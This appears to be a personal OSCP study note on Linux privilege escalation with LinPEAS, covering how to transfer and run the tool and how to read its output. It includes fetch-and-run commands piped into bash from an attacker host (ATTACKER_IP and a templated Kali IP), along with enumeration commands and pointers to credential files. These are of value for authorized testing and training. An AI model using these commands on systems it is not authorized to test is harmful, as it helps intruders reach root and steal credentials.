https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS

```
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
```

Directly execute into bash without downloading anyt
```dataviewjs
const page = dv.page("Templater/IP");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `curl http://${KaliIP}:[portno]/linpeas.sh | bash`;

dv.paragraph("```bash\n" + command + "\n```");
```

WinPEAS

```
wget https://github.com/peass-ng/PEASS-ng/releases/download/20260212-43b28429/winPEASx64.exe
```

```cmd
winPEASx64.exe
```

# 📂 LinPEAS – Linux Privilege Escalation Methodology

# LinPEAS – Linux Privilege Escalation Workflow  
  
Tags: #privilege-escalation #linux #linpeas #enumeration #oscp  
  
---  
  
## 🔎 What is LinPEAS?  
  
LinPEAS is part of PEASS-ng:  
https://github.com/carlospolop/PEASS-ng  
  
It automates Linux privilege escalation enumeration by highlighting:  
  
- Misconfigurations  
- Writable files  
- SUID binaries  
- Cron jobs  
- Credentials  
- Kernel exploits  
- Interesting capabilities  
  
⚠️ LinPEAS does NOT exploit automatically.  
It highlights potential attack paths.  
  
---  
  
# 🚀 Basic Usage  
  
## Transfer  
  
### From attacker:  
```bash  
python3 -m http.server 8000
```
```

### On target:

wget http://ATTACKER_IP:8000/linpeas.sh  
chmod +x linpeas.sh  
./linpeas.sh

Alternative:

curl http://ATTACKER_IP:8000/linpeas.sh | bash

---

# 🧠 How To Read LinPEAS Properly

DO NOT scroll randomly.

Follow this order:

---

## 1️⃣ System Information

Look at:

- Kernel version
    
- OS version
    
- Architecture
    
- Container detection
    
- Sudo version
    

Why?  
→ Determines kernel exploit viability  
→ Determines known privesc vectors

---

## 2️⃣ User & Group Info

Look for:

- Current user
    
- Groups
    
- Interesting group memberships:
    
    - docker
        
    - lxd
        
    - disk
        
    - adm
        
    - sudo
        
    - shadow
        

Group-based privilege escalation is often easier than kernel exploits.

---

## 3️⃣ SUDO Permissions

Highlighted in yellow/red.

If you see:

User may run the following commands...

Immediately test:

sudo -l

Then check:  
[https://gtfobins.github.io](https://gtfobins.github.io)

---

## 4️⃣ SUID Binaries

LinPEAS highlights unusual SUID files.

Normal:

- /usr/bin/passwd
    
- /usr/bin/sudo
    

Interesting:

- Custom binaries
    
- Scripts
    
- Unexpected interpreters
    

Manual check:

find / -perm -4000 -type f 2>/dev/null

Then compare with GTFOBins.

---

## 5️⃣ Writable Files

Look for:

- Writable cron scripts
    
- Writable service files
    
- Writable binaries executed by root
    

Common attack path:  
Writable script executed by root cron.

---

## 6️⃣ Cron Jobs

Look for:

- Root cron jobs
    
- Writable script locations
    
- Wildcard usage
    

Check manually:

cat /etc/crontab  
ls -la /etc/cron.*

---

## 7️⃣ Capabilities

Check:

getcap -r / 2>/dev/null

Example dangerous capability:

cap_setuid

If a binary has cap_setuid, it can escalate to root.

---

## 8️⃣ Credentials & Config Files

LinPEAS checks:

- /var/www/
    
- config.php
    
- .env
    
- database credentials
    
- backup files
    

Often leads to:

- SSH reuse
    
- Lateral movement
    
- Root login reuse
    

---

## 9️⃣ Processes & Services

Look for:

- Services running as root
    
- Custom scripts
    
- Unusual binaries
    

Then check if:

- Writable
    
- Misconfigured
    
- Running from writable directory
    

---

## 🔥 High-Value Findings (Prioritize These)

1. Sudo misconfigurations
    
2. Writable cron jobs
    
3. Custom SUID binaries
    
4. Docker/LXD group access
    
5. Capabilities (cap_setuid)
    
6. Credentials reuse
    

Kernel exploits should be LAST resort.

---

# 🎯 Professional Workflow

1. Gain shell
    
2. Stabilize TTY
    
3. Run LinPEAS
    
4. Save output:
    

./linpeas.sh | tee linpeas_output.txt

5. Download output
    
6. Analyze calmly
    

Do NOT escalate blindly.

---

# ⚠️ Common Beginner Mistakes

❌ Trying kernel exploit immediately  
❌ Ignoring sudo output  
❌ Ignoring writable cron  
❌ Not checking groups  
❌ Not manually verifying findings

LinPEAS is a guide, not magic.

---

# 🧩 Manual Enumeration Backup (If LinPEAS Fails)

id  
uname -a  
sudo -l  
find / -perm -4000 -type f 2>/dev/null  
getcap -r / 2>/dev/null  
cat /etc/crontab  
ps aux

You must be able to escalate WITHOUT LinPEAS for OSCP.